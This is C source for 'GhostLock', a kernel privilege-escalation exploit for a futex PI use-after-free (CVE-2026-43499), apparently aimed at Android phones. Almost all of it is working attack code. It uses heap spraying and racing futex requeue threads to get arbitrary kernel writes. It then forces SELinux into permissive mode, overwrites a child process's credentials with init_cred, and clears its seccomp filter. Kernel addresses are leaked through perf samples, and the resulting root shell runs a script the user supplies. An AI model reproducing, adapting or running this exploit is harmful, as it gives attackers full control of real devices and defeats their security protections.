/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 */

#include "common.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <poll.h>
#include "flat_json.h"
#include "patch_json.h"
#include "oneplus_bypass_bridge.h"


static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int owner_stop;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_inflight;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  while (!atomic_load(&owner_stop)) sleep(1);
  if (lock_target == 0)
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

void *consumer_thread(void *arg __attribute__((unused))) {
  pin_to_core(CONSUMER_CORE);
  pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        atomic_store(&consumer_inflight, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        atomic_store(&consumer_inflight, 0);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&owner_stop, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

int run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (const struct timespec *)1, &f_pi_target, 0);
  while (!atomic_load(&route_done)) usleep(5000);

  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);

  return atomic_load(&consumer_calls) > 0 &&
         atomic_load(&consumer_success) > 0 && cfi_last_step == 0;
}

static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
  /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
   * case 1 then makes __rb_change_child() write parent->rb_right (= target)
   * with the erased node's rb_right value: fake_left is always NULL so case 1
   * always fires, and the erased node is RED so no color fixup runs. */
  pselect_child_node = leaf ? 0 : 1;
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  int routed = run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
  if (!routed) {
    pr_warning("  PI route did not produce a verified write\n");
  }
  return routed;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) {
    /* untrusted_app often cannot read enforce while SELinux is enforcing. */
    return 0;
  }
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int enforce_readable(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) return 0;
  close(efd);
  return 1;
}

static int process_has_seccomp(void) {
  /* The app flow runs inside zygote, whose seccomp filter blocks
   * finit_module(2). The adb/shell flow has no filter (Seccomp: 0), and
   * fork() inherits that, so the W2 child does not need W3 there. */
  FILE *status = fopen("/proc/self/status", "r");
  if (!status) return 0;
  char line[256];
  int seccomp = 0;
  while (fgets(line, sizeof(line), status)) {
    if (strncmp(line, "Seccomp:", 8) == 0) {
      seccomp = atoi(line + 8);
      break;
    }
  }
  fclose(status);
  return seccomp != 0;
}

static void slab_drain(void) {
  /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
   * (exit 137) especially right before heap spray. */
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 2 : 1;
  int batch = (up.tv_sec > 60) ? 64 : 32;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = (pid_t *)calloc((size_t)batch, sizeof(pid_t));
    if (!drain) return;
    int n = 0;
    for (int i = 0; i < batch; i++) {
      pid_t pid = fork();
      if (pid == 0) {
        pause();
        _exit(0);
      }
      if (pid > 0) drain[n++] = pid;
      else break;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
    usleep(20000);
  }
}

int g_core_main = 0;
int g_core_consumer = 1;
#define MAX_CPUS 256
#define MAX_PAIRS 256

typedef struct {
  int cpu;
  long freq;
} cpu_freq_t;

typedef struct {
  int main_core;
  int consumer_core;
} cpu_pair_t;

static long read_sysfs_long(const char *path) {
  FILE *fp = fopen(path, "r");
  if (!fp) {
    return -1;
  }
  char buf[64];
  if (!fgets(buf, sizeof(buf), fp)) {
    fclose(fp);
    return -1;
  }
  fclose(fp);
  return strtol(buf, NULL, 10);
}

static int parse_online_cpus(int *out, int max) {
  FILE *fp = fopen("/sys/devices/system/cpu/online", "r");
  if (!fp) {
    return 0;
  }
  char buf[256];
  if (!fgets(buf, sizeof(buf), fp)) {
    fclose(fp);
    return 0;
  }
  fclose(fp);

  int n = 0;
  for (char *p = buf; *p && n < max;) {
    while (*p == ' ' || *p == ',') {
      p++;
    }
    if (!*p || *p == '\n') {
      break;
    }
    char *end;
    long a = strtol(p, &end, 10);
    if (end == p) {
      break;
    }
    p = end;
    long b = a;
    if (*p == '-') {
      p++;
      b = strtol(p, &end, 10);
      if (end == p) {
        break;
      }
      p = end;
    }
    for (long v = a; v <= b && n < max; v++) {
      out[n++] = (int)v;
    }
  }
  return n;
}

static int cmp_cpu_freq_desc(const void *a, const void *b) {
  const cpu_freq_t *x = (const cpu_freq_t *)a;
  const cpu_freq_t *y = (const cpu_freq_t *)b;
  if (x->freq != y->freq) {
    return (x->freq < y->freq) - (x->freq > y->freq); /* 频率降序 */
  }
  return x->cpu - y->cpu; /* 同频按编号升序 */
}

void init_cpu_config(void) {
  int online[MAX_CPUS];
  int ncpu = parse_online_cpus(online, MAX_CPUS);

  cpu_freq_t freqs[MAX_CPUS];
  int nf = 0;
  for (int i = 0; i < ncpu && nf < MAX_CPUS; i++) {
    char path[128];
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq",
             online[i]);
    long f = read_sysfs_long(path);
    if (f <= 0) {
      continue; /* 读不到最大频率的核不参与配对 */
    }
    freqs[nf].cpu = online[i];
    freqs[nf].freq = f;
    nf++;
  }

  cpu_pair_t pairs[MAX_PAIRS];
  int npair = 0;

  if (nf >= 2) {
    qsort(freqs, nf, sizeof(freqs[0]), cmp_cpu_freq_desc);

    /* 按频率簇分组（同频），簇内两两配对，大核簇排最前 */
    for (int i = 0; i < nf && npair < MAX_PAIRS;) {
      int j = i;
      while (j < nf && freqs[j].freq == freqs[i].freq) {
        j++;
      }
      int cnt = j - i;
      for (int k = 0; k + 1 < cnt && npair < MAX_PAIRS; k += 2) {
        pairs[npair].main_core = freqs[i + k].cpu;
        pairs[npair].consumer_core = freqs[i + k + 1].cpu;
        npair++;
      }
      i = j;
    }
  }

  /* 兜底：确保 0/1 一定作为候选（与 Android 端行为一致） */
  int have_default = 0;
  for (int i = 0; i < npair; i++) {
    if (pairs[i].main_core == 0 && pairs[i].consumer_core == 1) {
      have_default = 1;
      break;
    }
  }
  if (!have_default && npair < MAX_PAIRS) {
    pairs[npair].main_core = 0;
    pairs[npair].consumer_core = 1;
    npair++;
  }

  printf("available cpu pairs (%d):\n", npair);
  for (int i = 0; i < npair; i++) {
    long f = -1;
    for (int k = 0; k < nf; k++) {
      if (freqs[k].cpu == pairs[i].main_core) {
        f = freqs[k].freq;
        break;
      }
    }
    printf("  [%d] main=%d consumer=%d", i, pairs[i].main_core,
           pairs[i].consumer_core);
    if (f > 0) {
      printf("  (%ld MHz)", f / 1000);
    }
    printf("\n");
  }

  int chosen = 0;

  /* 环境变量显式指定时优先（与 Android 端传参保持一致） */
  const char *sc = getenv("GHOSTLOCK_CORE");
  const char *cc = getenv("GHOSTLOCK_CONSUMER_CORE");
  if (sc && *sc && cc && *cc) {
    long vm = strtol(sc, NULL, 10);
    long vc = strtol(cc, NULL, 10);
    if (vm >= 0 && vm < CPU_SETSIZE && vc >= 0 && vc < CPU_SETSIZE &&
        vm != vc) {
      g_core_main = (int)vm;
      g_core_consumer = (int)vc;
      chosen = 1;
    } else {
      pr_warning("invalid env cores %s/%s; falling back to auto\n", sc, cc);
    }
  }

  /* 自动选最合适的：候选列表第 0 组（大核对） */
  if (!chosen) {
    if (npair > 0) {
      g_core_main = pairs[0].main_core;
      g_core_consumer = pairs[0].consumer_core;
    } else {
      g_core_main = 0;
      g_core_consumer = 1;
    }
  }

  cpu_set_t allowed;
  if (sched_getaffinity(0, sizeof(allowed), &allowed) == 0 &&
      (!CPU_ISSET(g_core_main, &allowed) ||
       !CPU_ISSET(g_core_consumer, &allowed))) {
    pr_warning("cores %d/%d not in allowed cpuset; falling back to 0/1\n",
               g_core_main, g_core_consumer);
    g_core_main = 0;
    g_core_consumer = 1;
  }

  pr_info("cpu pair: main=%d consumer=%d\n", g_core_main, g_core_consumer);
}

/* Find a task through perf sample records. */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf_event_open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = (struct perf_event_mmap_page *)buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (struct perf_event_header *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  setpgid(0, 0);  /* own group so the parent can kill the whole late-load
                   * tree (sh) on timeout */
  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* spawned daemons must not
                                          * inherit the report pipe */
  prctl(PR_SET_NAME, "ghostleaf_0123456789");
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'F') {
      /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
       * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
       * filter); mode==0 lets it run filter-free to a normal errno. Forked
       * so SIGSYS costs only this. */
      uint32_t code = 0xffffffff;
      int probe_pipe[2];
      if (pipe(probe_pipe) == 0) {
        pid_t probe = fork();
        if (probe == 0) {
          close(probe_pipe[0]);
          /* Forked probe: keep default SIGSYS so the filter kills it. */
          signal(SIGSYS, SIG_DFL);
          errno = 0;
          long r = syscall(__NR_finit_module, 0, 0, 0);
          uint32_t out = (r == 0) ? 0 : (uint32_t)errno;
          ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
          (void)nw;
          _exit(0);
        }
        close(probe_pipe[1]);
        int st = 0;
        if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
          ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
          if (nr != (ssize_t)sizeof(code)) code = 0xfffffffe;
        } else {
          code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
        }
        close(probe_pipe[0]);
      }
      write(p->uid_w, &code, sizeof(code));
    }
    else if (cmd == 'M') {
      /* Report comm length + first byte to tell which side a leaf=1 write
       * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
       * [target+8] len 8, untouched len 15. */
      char comm[24] = {0};
      FILE *cf = fopen("/proc/self/comm", "r");
      if (cf) {
        size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
        (void)n;
        fclose(cf);
      }
      size_t len = strlen(comm);
      while (len > 0 && comm[len - 1] == '\n') {
        comm[len - 1] = 0;
        len--;
      }
      uint32_t report =
        ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
      write(p->uid_w, &report, sizeof(report));
    }
    else if (cmd == 'G' || cmd == 'X') break;
  }
  close(p->cmd_r);
  if (getuid() != 0) { close(p->uid_w); _exit(1); }
  /* Keep the app-side pipe/exit fds out of the late-load worker chain: a
   * lingering holder daemons would keep the app's read and
   * waitFor blocked after this process exits. */
  for (int fd = 3; fd < 1024; fd++) {
    int fl = fcntl(fd, F_GETFD);
    if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
  }

  pid_t worker = fork();
  if (worker == 0) {
    execl("/system/bin/sh", "sh", g_root_script_path, NULL);
    _exit(1);
  }
  int wst = -1;
  if (worker > 0) waitpid(worker, &wst, 0);
  uint32_t report = 0;
  ssize_t nw = write(p->uid_w, &report, sizeof(report));
  (void)nw;
  close(p->uid_w);  _exit(0);
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

typedef int (*write_stage_verify_fn)(void *context);

static int retry_write_stage(
    const char *stage, uintptr_t target, int mode, int attempts,
    useconds_t settle_usec, write_stage_verify_fn verify, void *context,
    int leaf) {
  for (int attempt = 1; attempt <= attempts; attempt++) {
    pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
    if (attempt == 1) slab_drain();
    int routed = do_one_write(target, stage, mode, leaf);
    if (!routed) {
      pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
      usleep(100000);
      continue;
    }
    if (settle_usec) usleep(settle_usec);
    if (verify(context)) return 1;
    usleep(50000);
  }
  return 0;
}

static int verify_selinux_stage(void *context) {
  (void)context;
  if (!check_selinux_off()) return 0;
  pr_success("SELinux permissive\n");
  return 1;
}

struct w2_stage_context {
  struct child_pipes *pipes;
};

struct w3_stage_context {
  struct child_pipes *pipes;
  int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
};

static int verify_w2_stage(void *context) {
  struct w2_stage_context *stage = (struct w2_stage_context *)context;
  if (write(stage->pipes->cmd_w, "C", 1) != 1) return 0;

  uint32_t child_uid = 9999;
  if (read(stage->pipes->uid_r, &child_uid, sizeof(child_uid)) !=
      (ssize_t)sizeof(child_uid)) {
    return 0;
  }
  pr_info("child uid = %u\n", child_uid);
  if (child_uid != 0) return 0;
  pr_success("child is root!\n");
  return 1;
}

static int verify_seccomp_probe_stage(void *context) {
  struct w2_stage_context *stage = (struct w2_stage_context *)context;
  if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;

  uint32_t code = 0;
  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
      (ssize_t)sizeof(code)) {
    return 0;
  }
  pr_info("seccomp finit_module probe = 0x%x\n", code);
  /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
   * With init_cred + permissive SELinux a real probe fails with a normal
   * errno instead. */
  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
      code == 1 || code == 38) {
    return 0;
  }
  pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
  return 1;
}

static int verify_leaf_dir_stage(void *context) {
  struct w3_stage_context *stage = (struct w3_stage_context *)context;
  if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;

  uint32_t report = 0;
  if (read(stage->pipes->uid_r, &report, sizeof(report)) !=
      (ssize_t)sizeof(report)) {
    return 0;
  }
  size_t len = (report >> 8) & 0xff;
  unsigned char c0 = (unsigned char)(report & 0xff);
  pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned)len, c0);
  if (len == 8) {
    stage->leaf_to_target8 = 1;
    pr_info("leaf=1 write lands on [target+8]\n");
    return 1;
  }
  if (len == 0) {
    stage->leaf_to_target8 = 0;
    pr_info("leaf=1 write lands on [target]\n");
    return 1;
  }
  if (len == 15) {
    pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
    return 0;
  }
  pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned)len, c0);
  return 0;
}

int run_exploit(int argc, char **argv) {
  if (argc > 2 && argv[1] && argv[2] && strlen(g_patch_json) == 0) {
    if (!load_patch_json_from_file(argv[1], g_patch_json, sizeof(g_patch_json))) {
      printf("load_patch_json_from_file failed.\n");
      return 1;
    }
    strncpy(g_root_script_path, argv[2], sizeof(g_root_script_path) - 1);
    g_root_script_path[sizeof(g_root_script_path) - 1] = '\0';
    printf("load_patch_json_from_file success: %s.\n", g_root_script_path);
  }
  if(!load_cve2026_43499_config(g_patch_json)) {
    printf("load cve-2026-43499 config failed.\n");
    return 1;
  }
  g_init_cred_image = INIT_CRED;

  set_unbuffer();
  signal(SIGPIPE, SIG_IGN);
  set_limit();
  init_cpu_config();

  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  pr_info("main thread running on cpu=%d\n", sched_getcpu());

  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;

  timer_reset();
  TIMER("exploit start");

  /* W1: disable SELinux before task discovery. untrusted_app may not be able
   * to read enforce while it is still enforcing, so attempt W1 regardless. */
  int selinux_ok = check_selinux_off();
  if (!selinux_ok) {
    if (!enforce_readable()) {
      pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
    }
    TIMER("pre-W1 drain");
    selinux_ok = retry_write_stage(
        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 8, 100000,
        verify_selinux_stage, NULL, 0);
    if (!selinux_ok) {
      pr_warning("Write 1 failed\n");
      return 1;
    }
    TIMER("Write 1 complete");
  } else {
    pr_success("SELinux already permissive\n");
  }

  printf("=== [GHOSTLOCK] SELINUX IS NOW PERMISSIVE ===\n");
  check_oplus_device_bypass();

  /* W2: overwrite the child credential via the task leaked by perf. */
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  struct w2_stage_context w2_context = { .pipes = &pipes };
  pid_t child = -1;
  uintptr_t child_task = 0;
  int child_alive = 1;
  int seccomp_ok = 0;

  /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
   * child, so respawn and redo instead of aborting. */
  for (int round = 1; round <= 3; round++) {
    if (round > 1) {
      pr_warning("W3 chain retry %d/3: respawning child\n", round);
      if (child > 0 && child_alive) {
        kill(-child, SIGKILL);
        waitpid(child, NULL, 0);
      }
      close(pipes.cmd_w); close(pipes.uid_r);
      child_alive = 1;
      seccomp_ok = 0;
    }

    child = spawn_child(&pipes);
    if (child < 0) {
      pr_warning("fork failed\n");
      return 1;
    }

    child_task = 0;
    read(pipes.task_r, &child_task, sizeof(child_task));
    close(pipes.task_r);
    TIMER("perf_find_task done");

    if (!child_task) {
      /* perf leaked nothing; respawn and retry once */
      pr_info("perf returned 0, retrying...\n");
      waitpid(child, NULL, 0);
      child = spawn_child(&pipes);
      if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
      child_task = 0;
      read(pipes.task_r, &child_task, sizeof(child_task));
      close(pipes.task_r);
    }

    if (!child_task) {
      pr_warning("Cannot find task_struct (perf leak failed)\n");
      close(pipes.cmd_w);
      waitpid(child, NULL, 0);
      return 1;
    }

    pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
    pselect_child_node = 1;

    int got_root = retry_write_stage(
        "W2: cred", child_task + TASK_CRED_OFF, 2, 10, 50000,
        verify_w2_stage, &w2_context, 0);
    if (!got_root) {
      write(pipes.cmd_w, "X", 1);
      close(pipes.cmd_w); close(pipes.uid_r);
      pr_warning("W2 failed after 10 rounds\n");
      waitpid(child, NULL, 0);
      return 1;
    }

    /* W3: clear the child's seccomp filter for the late-load worker
     * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
     * must be zeroed too; do both writes back-to-back with one probe
     * (real finit_module calls trip vendor root guards).
     * Leaf writes land on [target] or [target+8]; a comm probe picks the side
     * before targeting thread_info.flags (task+0) / seccomp.mode. */
    if (!process_has_seccomp()) {
      pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
      seccomp_ok = 1;
      break;
    }

    struct w3_stage_context w3_context = {
      .pipes = &pipes,
      .leaf_to_target8 = 1,
    };
    int dir_ok = retry_write_stage(
        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
        verify_leaf_dir_stage, &w3_context, 1);
    if (!dir_ok) {
      pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
    }

    uintptr_t flags_target = w3_context.leaf_to_target8
      ? child_task - 8
      : child_task + TASK_THREAD_INFO_FLAGS_OFF;
    uintptr_t mode_target = w3_context.leaf_to_target8
      ? child_task + TASK_SECCOMP_OFF - 8
      : child_task + TASK_SECCOMP_OFF;

    for (int attempt = 1; attempt <= 6; attempt++) {
      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
      if (attempt == 1) slab_drain();
      int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
      if (!routed) {
        pr_warning("W3 attempt %d route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
      if (!routed) {
        pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      int st = 0;
      if (waitpid(child, &st, WNOHANG) == child) {
        pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
        child_alive = 0;
        break;
      }
      if (verify_seccomp_probe_stage(&w2_context)) {
        seccomp_ok = 1;
        break;
      }
      usleep(50000);
    }

    if (!seccomp_ok) {
      pr_warning("W3 seccomp clear failed\n");
      continue; /* respawn and redo the chain */
    }
    pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
    break;
  }

  if (!seccomp_ok)
    pr_warning("W3 seccomp bypass failed after 3 chain rounds\n");

  sleep(2);
  TIMER("exploit complete");
  if (child_alive) {
    if (write(pipes.cmd_w, "G", 1) != 1)
      pr_warning("failed to start late-load worker (child exited early)\n");
  } else {
    pr_warning("skipping late-load: child died during W3\n");
  }
  close(pipes.cmd_w);
  uint32_t child_report = 0;
  if (child_alive) {
    /* Bound the late-load handoff: if the worker hangs (e.g. a kernel lock
     * inside a script step), kill the whole tree so the app flow finishes. */
    int waited_ms = 0;
    for (;;) {
      pid_t r = waitpid(child, NULL, WNOHANG);
      if (r == child || r < 0) break;
      if (waited_ms >= 45000) {
        pr_warning("late-load worker timed out; killing child\n");
        kill(-child, SIGKILL);
        waitpid(child, NULL, 0);
        break;
      }
      usleep(100000);
      waited_ms += 100;
    }
    struct pollfd pfd = { .fd = pipes.uid_r, .events = POLLIN };
    ssize_t nr = -1;
    if (poll(&pfd, 1, 10000) > 0 && (pfd.revents & POLLIN)) {
      nr = read(pipes.uid_r, &child_report, sizeof(child_report));
    }
    if (nr != (ssize_t)sizeof(child_report)) child_report = 0;
  }
  close(pipes.uid_r);

  pr_warning("temporary root ready\n");
  return 0;
}

